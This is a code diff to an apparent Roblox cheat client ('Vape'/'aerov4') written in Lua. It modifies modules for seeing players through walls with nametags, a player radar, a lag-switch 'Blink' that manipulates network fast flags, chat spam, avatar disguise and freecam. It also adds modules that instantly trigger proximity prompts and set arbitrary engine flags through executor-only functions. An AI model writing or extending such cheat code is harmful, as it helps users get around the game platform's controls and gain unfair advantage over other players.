 					Strings[ent] = '<font color="rgb(85, 255, 85)">[</font><font color="rgb(255, 255, 255)">%s</font><font color="rgb(85, 255, 85)">]</font> '..Strings[ent]
 				end
 	
-				local ize = getfontsize(removeTags(Strings[ent]), nametag.TextSize, nametag.FontFace, Vector2.new(100000, 100000))
-				nametag.Size = UDim2.fromOffset(ize.X + 8, ize.Y + 7)
+				local size = getfontsize(removeTags(Strings[ent]), nametag.TextSize, nametag.FontFace, Vector2.new(100000, 100000))
+				nametag.Size = UDim2.fromOffset(size.X + 8, size.Y + 7)
 				nametag.Text = Strings[ent]
 			end
 		end,
@@ -4940,7 +5071,7 @@ run(function()
 					end
 				end
 	
-				local headPos, headVis = gameCamera:WorldToScreenPoint(ent.RootPart.Position + Vector3.new(0, ent.HipHeight + 1, 0))
+				local headPos, headVis = gameCamera:WorldToViewportPoint(ent.RootPart.Position + Vector3.new(0, ent.HipHeight + 1, 0))
 				nametag.Text.Visible = headVis
 				nametag.BG.Visible = headVis
 				if not headVis then
@@ -4955,8 +5086,8 @@ run(function()
 						Sizes[ent] = mag
 					end
 				end
-				nametag.BG.Position = Vector2.new(headPos.X - (nametag.BG.Size.X / 2), headPos.Y + (nametag.BG.Size.Y / 2))
-				nametag.Text.Position = nametag.BG.Position + Vector2.new(4, 2.5)
+				nametag.BG.Position = Vector2.new(headPos.X - (nametag.BG.Size.X / 2), headPos.Y - nametag.BG.Size.Y)
+				nametag.Text.Position = nametag.BG.Position + Vector2.new(4, 3)
 			end
 		end
 	}
@@ -5263,20 +5394,20 @@ run(function()
 			setthreadidentity(8)
 		end
 	
-		local EntityDot = Instance.new('Frame')
-		EntityDot.Size = UDim2.fromOffset(4, 4)
-		EntityDot.AnchorPoint = Vector2.new(0.5, 0.5)
-		EntityDot.BackgroundColor3 = entitylib.getEntityColor(ent) or Color3.fromHSV(PlayerColor.Hue, PlayerColor.Sat, PlayerColor.Value)
-		EntityDot.Parent = bkg
-		local EntityCorner = Instance.new('UICorner')
-		EntityCorner.CornerRadius = UDim.new(DotStyle.Value == 'Circles' and 1 or 0, 0)
-		EntityCorner.Parent = EntityDot
-		local EntityStroke = Instance.new('UIStroke')
-		EntityStroke.Color = Color3.new()
-		EntityStroke.Thickness = 1
-		EntityStroke.Transparency = 0.8
-		EntityStroke.Parent = EntityDot
-		Reference[ent] = EntityDot
+		local dot = Instance.new('Frame')
+		dot.Size = UDim2.fromOffset(4, 4)
+		dot.AnchorPoint = Vector2.new(0.5, 0.5)
+		dot.BackgroundColor3 = entitylib.getEntityColor(ent) or Color3.fromHSV(PlayerColor.Hue, PlayerColor.Sat, PlayerColor.Value)
+		dot.Parent = bkg
+		local corner = Instance.new('UICorner')
+		corner.CornerRadius = UDim.new(DotStyle.Value == 'Circles' and 1 or 0, 0)
+		corner.Parent = dot
+		local stroke = Instance.new('UIStroke')
+		stroke.Color = Color3.new()
+		stroke.Thickness = 1
+		stroke.Transparency = 0.8
+		stroke.Parent = dot
+		Reference[ent] = dot
 	end
 	
 	local function Removed(ent)
@@ -5311,21 +5442,21 @@ run(function()
 					Added(ent)
 				end))
 				Radar:Clean(vape.Categories.Friends.ColorUpdate.Event:Connect(function()
-					for ent, EntityDot in Reference do
-						EntityDot.BackgroundColor3 = entitylib.getEntityColor(ent) or Color3.fromHSV(PlayerColor.Hue, PlayerColor.Sat, PlayerColor.Value)
+					for ent, dot in Reference do
+						dot.BackgroundColor3 = entitylib.getEntityColor(ent) or Color3.fromHSV(PlayerColor.Hue, PlayerColor.Sat, PlayerColor.Value)
 					end
 				end))
 				Radar:Clean(runService.RenderStepped:Connect(function()
-					for ent, EntityDot in Reference do
+					for ent, dot in Reference do
 						if entitylib.isAlive then
 							local dt = CFrame.lookAlong(entitylib.character.RootPart.Position, gameCamera.CFrame.LookVector * Vector3.new(1, 0, 1)):PointToObjectSpace(ent.RootPart.Position)
-							EntityDot.Position = UDim2.fromOffset(Clamp.Enabled and math.clamp(108 + dt.X, 2, 214) or 108 + dt.X, Clamp.Enabled and math.clamp(108 + dt.Z, 8, 214) or 108 + dt.Z)
+							dot.Position = UDim2.fromOffset(Clamp.Enabled and math.clamp(108 + dt.X, 2, 214) or 108 + dt.X, Clamp.Enabled and math.clamp(108 + dt.Z, 8, 214) or 108 + dt.Z)
 						end
 					end
 				end))
 			else
-				for ent in Reference do 
-					Removed(ent) 
+				for ent in Reference do
+					Removed(ent)
 				end
 			end
 		end
@@ -5351,8 +5482,8 @@ run(function()
 	PlayerColor = Radar:CreateColorSlider({
 		Name = 'Player Color',
 		Function = function(hue, sat, val)
-			for ent, EntityDot in Reference do
-				EntityDot.BackgroundColor3 = entitylib.getEntityColor(ent) or Color3.fromHSV(hue, sat, val)
+			for ent, dot in Reference do
+				dot.BackgroundColor3 = entitylib.getEntityColor(ent) or Color3.fromHSV(hue, sat, val)
 			end
 		end
 	})
@@ -5499,10 +5630,13 @@ end)
 run(function()
 	local SessionInfo
 	local FontOption
+	local Hide
 	local TextSize
 	local BorderColor
 	local Title
 	local TitleOffset = {}
+	local Custom
+	local CustomBox
 	local infoholder
 	local infolabel
 	local infostroke
@@ -5536,9 +5670,27 @@ run(function()
 						if Title.Enabled then
 							stuff[1] = TitleOffset.Enabled and '<b>Session Info</b>\n<font size="4"> </font>' or '<b>Session Info</b>'
 						end
+	
 						for i, v in vape.Libraries.sessioninfo.Objects do
-							stuff[v.Index] = i..': '..v.Function(v.Value)
+							stuff[v.Index] = not table.find(Hide.ListEnabled, i) and i..': '..v.Function(v.Value) or false
 						end
+	
+						if #Hide.ListEnabled > 0 then
+							local key, val
+							repeat
+								local oldkey = key
+								key, val = next(stuff, key)
+								if val == false then
+									table.remove(stuff, key)
+									key = oldkey
+								end
+							until not key
+						end
+	
+						if Custom.Enabled then
+							table.insert(stuff, CustomBox.Value)
+						end
+	
 						if not Title.Enabled then
 							table.remove(stuff, 1)
 						end
@@ -5556,6 +5708,14 @@ run(function()
 	FontOption = SessionInfo:CreateFont({
 		Name = 'Font',
 		Blacklist = 'Arial'
+	})
+	Hide = SessionInfo:CreateTextList({
+		Name = 'Blacklist',
+		Tooltip = 'Name of entry to hide.',
+		Icon = getcustomasset('newvape/assets/new/blockedicon.png'),
+		Tab = getcustomasset('newvape/assets/new/blockedtab.png'),
+		TabSize = UDim2.fromOffset(21, 16),
+		Color = Color3.fromRGB(250, 50, 56)
 	})
 	SessionInfo:CreateColorSlider({
 		Name = 'Background Color',
@@ -5601,6 +5761,17 @@ run(function()
 			infostroke.Enabled = callback
 			BorderColor.Object.Visible = callback
 		end
+	})
+	Custom = SessionInfo:CreateToggle({
+		Name = 'Add custom text',
+		Function = function(enabled)
+			CustomBox.Object.Visible = enabled
+		end
+	})
+	CustomBox = SessionInfo:CreateTextBox({
+		Name = 'Custom text',
+		Darker = true,
+		Visible = false
 	})
 	infoholder = Instance.new('Frame')
 	infoholder.BackgroundColor3 = Color3.new()
@@ -6005,9 +6176,9 @@ run(function()
 					return string.match(game:GetObjects('rbxassetid://'..IDBox.Value)[1].AnimationId, '%?id=(%d+)')
 				end)
 				animobject.AnimationId = 'rbxassetid://'..(suc and id or IDBox.Value)
-				
-				if entitylib.isAlive then 
-					playAnimation(entitylib.character) 
+	
+				if entitylib.isAlive then
+					playAnimation(entitylib.character)
 				end
 				AnimationPlayer:Clean(entitylib.Events.LocalAdded:Connect(playAnimation))
 				AnimationPlayer:Clean(animobject)
@@ -6116,7 +6287,7 @@ run(function()
 			if callback then
 				local teleported
 				Blink:Clean(lplr.OnTeleport:Connect(function()
-					setfflag('S2PhysicsSenderRate', '15')
+					setfflag('PhysicsSenderMaxBandwidthBps', '38760')
 					setfflag('DataSenderRate', '60')
 					teleported = true
 				end))
@@ -6124,20 +6295,20 @@ run(function()
 				repeat
 					local physicsrate, senderrate = '0', Type.Value == 'All' and '-1' or '60'
 					if AutoSend.Enabled and tick() % (AutoSendLength.Value + 0.1) > AutoSendLength.Value then
-						physicsrate, senderrate = '15', '60'
+						physicsrate, senderrate = '38760', '60'
 					end
 	
 					if physicsrate ~= oldphys or senderrate ~= oldsend then
-						setfflag('S2PhysicsSenderRate', physicsrate)
+						setfflag('PhysicsSenderMaxBandwidthBps', physicsrate)
 						setfflag('DataSenderRate', senderrate)
-						oldphys, oldsend = physicsrate, oldsend
+						oldphys, oldsend = physicsrate, senderrate
 					end
-					
+	
 					task.wait(0.03)
 				until (not Blink.Enabled and not teleported)
 			else
 				if setfflag then
-					setfflag('S2PhysicsSenderRate', '15')
+					setfflag('PhysicsSenderMaxBandwidthBps', '38760')
 					setfflag('DataSenderRate', '60')
 				end
 				oldphys, oldsend = nil, nil
@@ -6205,7 +6376,7 @@ run(function()
 				
 				local ind = 1
 				repeat
-					local message = (#Lines.ListEnabled > 0 and Lines.ListEnabled[math.random(1, #Lines.ListEnabled)] or 'vxpe on top')
+					local message = (#Lines.ListEnabled > 0 and Lines.ListEnabled[math.random(1, #Lines.ListEnabled)] or 'aerov4 on top')
 					if Mode.Value == 'Order' and #Lines.ListEnabled > 0 then
 						message = Lines.ListEnabled[ind] or Lines.ListEnabled[1]
 						ind = (ind % #Lines.ListEnabled) + 1
@@ -6545,8 +6716,8 @@ run(function()
 						end
 					end))
 	
-					contextService:BindActionAtPriority('FreecamKeyboard'..randomkey, function() 
-						return Enum.ContextActionResult.Sink 
+					contextService:BindActionAtPriority('FreecamKeyboard'..randomkey, function()
+						return Enum.ContextActionResult.Sink
 					end, false, Enum.ContextActionPriority.High.Value,
 						Enum.KeyCode.W,
 						Enum.KeyCode.A,
@@ -7309,7 +7480,7 @@ run(function()
 			repeat
 				if pcall(function()
 					desc = playersService:GetHumanoidDescriptionFromUserId(IDBox.Value == '' and 239702688 or tonumber(IDBox.Value))
-				end) then break end
+				end) and desc then break end
 				task.wait(1)
 			until not Disguise.Enabled
 			if not Disguise.Enabled then
@@ -7454,7 +7625,7 @@ run(function()
 		end
 	})
 end)
-
+	
 run(function()
 	local FOV
 	local Value
@@ -7977,3 +8148,63 @@ run(function()
 	
 end)
 	
+	
+run(function()
+    local PromptButtonHoldBegan = nil
+    local ProximityPromptService = cloneref(game:GetService('ProximityPromptService'))
+
+    local InstantPP = vape.Categories.Utility:CreateModule({
+        Name = 'InstantPP',
+        Function = function(callback)
+            if callback then
+                if fireproximityprompt then
+                    PromptButtonHoldBegan = ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
+                        fireproximityprompt(prompt)
+                    end)
+                else
+                    errorNotification('InstantPP', 'Your executer does not support this command (missing fireproximityprompt)', 5)
+                    InstantPP:Toggle()
+                end
+            else
+                if PromptButtonHoldBegan ~= nil then
+                    PromptButtonHoldBegan:Disconnect()
+                    PromptButtonHoldBegan = nil
+                end
+            end
+        end,
+        Tooltip = 'Instantly activates proximity prompts.'
+    })
+end)
+
+run(function()
+	local FFlag
+	local FFlag 
+	local Value
+	FFlag = vape.Legit:CreateModule({
+		Name = "FFlag",
+		Function = function(callback)
+			if not callback then return end
+			if callback then
+				if not setfflag then vape:CreateNotification("FFlag", "your current executor is shit asf: '"..identifyexecutor().."' just doesnt support setfflag please quit", 6, "warning"); return end
+				local s, e = pcall(function()
+					local FFlags = httpService:JSONDecode(FFlag.Value)
+					for a, b in FFlags do
+						task.spawn(function()
+							local i = tostring(a)
+							local v = tostring(b)
+							setfflag(i,v)
+						end)
+					end
+				end)
+				if not s then
+					vape:CreateNotification("fflag", "error: "..e, 6, "alert")
+				end
+			end
+		end,
+		Tooltip = "edit current flags or add new flags",
+	})
+	FFlag = FFlag:CreateTextBox({
+		Name = "JSON",
+		Tooltip = 'FFlag\'s MUST EXIST to use and MUST BE IN JSON FORM',
+	})
+end)
